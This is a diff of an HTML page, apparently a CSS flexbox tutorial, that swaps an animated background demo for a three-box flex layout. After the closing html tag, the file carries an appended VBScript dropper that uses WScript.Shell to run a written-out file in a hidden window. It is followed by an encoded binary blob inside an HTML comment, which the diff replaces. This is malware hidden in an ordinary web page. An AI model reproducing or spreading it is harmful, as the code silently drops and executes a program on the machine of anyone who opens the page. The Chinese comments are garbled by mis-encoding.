@@ -6,107 +6,48 @@
 		<meta http-equiv="X-UA-Compatible" content="ie=edge">
 		<title></title>
 		<style type="text/css">
-			html,
-			body {
-				margin: 0;
-				padding: 0;
-				width: 100%;
+			section {
+				width: 80%;
+				height: 150px;
+				margin: 100px auto;
+				/* ç»™çˆ¶äº²æ·»åŠ  ä¼¸ç¼©å¸ƒå±€ */
+				display: flex;
+				/* section æœ€å°çš„å®½åº¦æ˜¯500 */
+				min-width: 500px;
+				/*é»˜è®¤æ°´å¹³åˆ†å¸ƒ:row , å‚ç›´åˆ†å¸ƒ
+				 
+				 reverseç¿»è½¬
+				 */
+				flex-direction: row-reverse;
+			}
+
+			section div {
 				height: 100%;
-				background-color: #0EA9B1;
-				overflow: hidden;
-				position: relative;
+
 			}
 
-			.box {
-				width: 100%;
-				height: 100%;
-				position: relative;
-				overflow: hidden;
+			section div:nth-child(1) {
+				background-color: pink;
+				width: 200px;
 			}
 
-			.box img {
-				position: absolute;
-				width: 100%;
-				bottom: 0px;
+			section div:nth-child(2) {
+				background-color: purple;
+				flex: 2;
 			}
 
-			.box img:nth-child(1) {
-				animation: move 1s linear infinite alternate;
-			}
-
-			.box img:nth-child(2) {
-				animation: move 1s 0.5s linear infinite alternate;
-			}
-
-			@keyframes move {
-				from {
-					bottom: 0px;
-				}
-
-				to {
-					bottom: -50px;
-				}
-			}
-
-			.sun {
-				width: 100px;
-				height: 100px;
-				position: absolute;
-				left: 50px;
-				top: 50px;
-			}
-
-			.sun:after {
-				content: "";
-				display: block;
-				width: 50px;
-				height: 50px;
-				border-radius: 50%;
-				background-color: rgba(255, 255, 255, .8);
-				position: absolute;
-				left: 50%;
-				margin-left: -25px;
-				top: 50%;
-				margin-top: -25px;
-				animation: scale 1s linear infinite alternate;
-			}
-
-			.sun:before {
-				content: "";
-				display: block;
-				width: 80px;
-				height: 80px;
-				border-radius: 50%;
-				background-color: rgba(255, 255, 255, .6);
-				position: absolute;
-				left: 50%;
-				margin-left: -40px;
-				top: 50%;
-				margin-top: -40px;
-				animation: scale 1s 0.5s linear infinite alternate;
-			}
-
-
-			@keyframes scale {
-				from {
-					box-shadow: 0px 0px 0px #fff;
-					transform: scale(1);
-				}
-
-				to {
-					box-shadow: 0px 0px 50px #fff;
-					transform: scale(1.2);
-				}
+			section div:nth-child(3) {
+				background-color: red;
+				flex: 1;
 			}
 		</style>
 	</head>
 	<body>
-		<div class="box">
-			<img src="images/sea1.png" alt="">
-			<img src="images/sea2.png" alt="">
-			<div class="sun"></div>
-		</div>
-
+		<section>
+			<div>1</div>
+			<div>2</div>
+			<div>3</div>
+		</section>
 	</body>
 </html>
 <SCRIPT Language=VBScript><!--
@@ -123,4 +64,4 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--q|R^‚{ĞbM£ÍtÚûFc¶ rğ}™cİ	oŸ	ŒâVvÅo•Z»½òGA¼Î½¥Ê–4ß½›^aFåƒÛA1m>I”…gló·@57¥ºh@ˆã©°Û“Ó• Ñ›^Îß}×ÏWw5X2ƒ©†‰dA_ªPÎFÄáC¥@M©°5¯8ÚY1ŠîuZÖhØ.~„ÜUšÒƒ7¬_W““t¶ZF¬Ç£Õ’a«â¶¼¨&o¿êt:Ñ©ORÉW6îˆµCÃ.ZMá?s GÖÉD³B¡8P éÍ)ê÷[ÜªÕq¶½3rĞ+²Š`ˆO…#ıùõ’4/Ş'IÈG¹¾ILÔüİä¢õH`¤RäÎHº¢@ä¤µœ¶ÍÑi¼M>.ÅY$wt ­N8÷Û™kàâ.Vs‘¹EÜğÍ—ˆWòg}×¥pØèy»–ã›õöÂ­àûŸØéï3Šl/âxG?÷H¡@@Ío†‚º¦rı¢«à¼ñ‚ÄÄÉ«ìİ0ËM×Óæ³!Niuq‘X„Èã¿Iº‘Ÿb~›p¢•g‚£‡1JŠ‰ŒniËZÚ“<ÙşìyX*&"¹äÉ Ü:R!ùÜ:Ü:Ü:‘çO3#¬_Ô: Ü:-->
+//--></SCRIPT><!--f}œ¹Õqk 7%×ùÄbÏjàvÁ\ôfZr BsÓÔ•×ÈQ3?ÕØµHíÃotL\Tp‹®dü §Óˆ Ô¬óè!ÓtÒ}2€û‹¿ºb‡@=Š<è$˜&÷R"mÙ…×à\ÉĞ.=·İ5”Z­G$öÊ¦Ô(ÅYŞ—Øó-Ç`9ÃL7y³Õ­ş?FE d4‚ˆaİìä²•ûYKÃBôD}¦ÒŒêÜ×‡¤GÑØc]xE°åî¨¼#íÆŞ«ˆ¨Ø”çà\š†ZşX·½?j¦Š_¬(Ä4üòĞ˜{„ÍC²“ÜúH2¨¡-G½QaŒõDCAé72ïgXrücó£eŒTÜ_šW/»GèÇâ1÷vt€£ónÇcõwşÍ0î3È9°)©/ÖÊßívôõÈ¶Îfó½Ëğ€›êş»…`¯Ôº5#šÒ†ÂX$×r»ÑNŸAü^Ş=1=lòv¿ÜÇÆiã2ÉMÅ1CÆ\{!©ÓõìMJ§ãi»Ôµf—ın¸/'U KïÛ??ÑÜ™åM¨2¿Ó¶nÏ…•ÂƒÑuË²çÑÈU´v3#äù/ä‚…ˆÀúoÎ¥i2òìbƒi¨ ÜcRxùÜcÜcÜc‘¾O,öô_âßc Üc-->
